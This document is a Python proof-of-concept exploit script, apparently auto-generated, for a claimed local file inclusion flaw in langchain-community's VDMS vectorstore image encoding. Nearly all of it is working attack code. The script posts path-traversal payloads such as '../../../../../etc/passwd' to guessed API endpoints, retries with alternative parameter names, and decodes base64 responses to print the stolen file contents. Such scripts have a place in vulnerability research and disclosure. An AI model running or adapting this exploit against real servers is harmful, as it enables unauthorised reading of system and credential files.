#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-009
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_10.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The `add_images` method in VDMS vectorstore accepts a list of file paths
(uris) and passes them directly to `encode_image`, which opens the file without any
path validation or sanitization. An attacker can supply a path like '../../etc/passwd'
to read arbitrary files from the server.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign file if
/etc/passwd is not available) through the vulnerable API endpoint.

Usage:
    python3 poc_lfi.py [--target http://localhost:8000] [--file /etc/passwd]
"""

import argparse
import base64
import sys
import requests
from typing import List, Optional

# Default target URL (change as needed)
DEFAULT_TARGET = "http://localhost:8000"
# Default file to read (benign for testing)
DEFAULT_FILE = "/etc/passwd"


def exploit_lfi(target_url: str, file_path: str) -> Optional[str]:
    """
    Attempt to read a file from the server using the LFI vulnerability.

    Args:
        target_url: Base URL of the vulnerable application (e.g., http://localhost:8000)
        file_path: Path to the file to read (e.g., /etc/passwd or ../../etc/passwd)

    Returns:
        Decoded file content as string if successful, None otherwise.
    """
    # The vulnerable endpoint is typically /api/v1/trigger (as per the simulated wrapper)
    # but we'll try common patterns. Adjust if needed.
    endpoints = [
        "/api/v1/trigger",
        "/trigger",
        "/add_images",
        "/v1/trigger",
    ]

    for endpoint in endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}"
        print(f"[*] Trying endpoint: {url}")

        # The vulnerable function expects a list of URIs (file paths)
        # We send the malicious path as a JSON payload
        payload = {
            "uris": [file_path]  # Attacker-controlled path
        }

        try:
            # Send POST request with the payload
            response = requests.post(
                url,
                json=payload,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )

            # Check if the response contains base64-encoded data
            # The vulnerable function returns base64-encoded file content
            if response.status_code == 200:
                # Try to extract base64 data from response
                # The response might be a list of IDs or contain the base64 data
                response_text = response.text

                # Look for base64 patterns in the response
                # The encode_image function returns base64-encoded content
                # which is then stored in the vectorstore
                if response_text and len(response_text) > 50:
                    # Try to decode any base64-looking strings
                    import re
                    # Find all base64 strings (long alphanumeric strings with +/=)
                    b64_pattern = r'[A-Za-z0-9+/=]{50,}'
                    matches = re.findall(b64_pattern, response_text)

                    for match in matches:
                        try:
                            decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                            if decoded and len(decoded) > 10:
                                print(f"[+] Successfully read file from {url}")
                                return decoded
                        except Exception:
                            continue

                    # If no base64 found, maybe the response itself is the content
                    print(f"[*] Response received but no base64 content found:")
                    print(f"    {response_text[:200]}...")
                    return response_text

            elif response.status_code == 422:
                # Unprocessable Entity - might need different parameter name
                print(f"[-] 422 error - trying alternative parameter names...")
                # Try alternative parameter names
                alt_payloads = [
                    {"uri": [file_path]},
                    {"paths": [file_path]},
                    {"files": [file_path]},
                    {"image_paths": [file_path]},
                ]
                for alt_payload in alt_payloads:
                    try:
                        alt_response = requests.post(
                            url,
                            json=alt_payload,
                            timeout=10,
                            headers={"Content-Type": "application/json"}
                        )
                        if alt_response.status_code == 200:
                            print(f"[+] Success with alternative payload: {alt_payload}")
                            return alt_response.text
                    except Exception:
                        continue

            else:
                print(f"[-] HTTP {response.status_code}: {response.text[:100]}")

        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error to {url}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {url}")
        except Exception as e:
            print(f"[-] Error: {e}")

    return None


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community-only VDMS vectorstore"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--file",
        default=DEFAULT_FILE,
        help=f"File to read (default: {DEFAULT_FILE})"
    )
    parser.add_argument(
        "--traversal",
        action="store_true",
        help="Use path traversal (e.g., ../../etc/passwd)"
    )

    args = parser.parse_args()

    # If traversal flag is set, use relative path
    if args.traversal:
        # Calculate traversal depth based on typical web app structure
        file_path = f"../../../../..{args.file}"
    else:
        file_path = args.file

    print(f"[*] Target: {args.target}")
    print(f"[*] File to read: {file_path}")
    print("[*] Attempting LFI exploit...")
    print()

    result = exploit_lfi(args.target, file_path)

    if result:
        print("\n[+] Exploit successful! File contents:")
        print("=" * 60)
        print(result)
        print("=" * 60)
        return 0
    else:
        print("\n[-] Exploit failed. The target may not be vulnerable or")
        print("    the endpoint may be different. Try adjusting the target URL")
        print("    or using the --traversal flag.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
